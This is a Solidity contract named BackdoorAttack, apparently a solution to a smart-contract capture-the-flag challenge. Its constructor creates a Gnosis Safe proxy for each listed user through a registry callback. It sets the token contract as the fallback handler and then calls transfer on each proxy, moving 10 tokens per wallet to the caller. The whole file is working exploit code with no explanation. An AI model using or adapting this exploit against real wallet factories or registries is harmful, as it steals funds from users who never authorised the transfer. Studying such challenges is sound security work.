pragma solidity ^0.8.0;

interface IGnosisSafeProxyFactory {
  function createProxyWithCallback(
      address _singleton,
      bytes memory initializer,
      uint256 saltNonce,
      address callback
  ) external returns (address);
}

interface IGnosisSafe {
  function setup(
    address[] calldata _owners,
    uint256 _threshold,
    address to,
    bytes calldata data,
    address fallbackHandler,
    address paymentToken,
    uint256 payment,
    address payable paymentReceiver
  ) external;
}

interface IERC20 {
  function transfer(address _to, uint256 _amount) external;
}

contract BackdoorAttack {

  constructor(
    address _masterCopy, 
    address _factory, 
    address[] memory _users, 
    address _token,
    address _registry
  ) {
    IGnosisSafeProxyFactory factory = IGnosisSafeProxyFactory(_factory);

    for (uint i = 0; i < _users.length; i++) {
      address[] memory _owners = new address[](1);
      _owners[0] = _users[i];
      address proxy = factory.createProxyWithCallback(
        _masterCopy, 
        abi.encodeWithSelector(
          IGnosisSafe.setup.selector, 
          _owners, // owners
          1, // threshold
          address(0), // to
          "", // data
          _token, // fallback handler
          address(0), // payment token
          address(0) // payment receiver
        ),
        i,
        _registry);

      IERC20(proxy).transfer(msg.sender, 10 ether);
    }
  }

}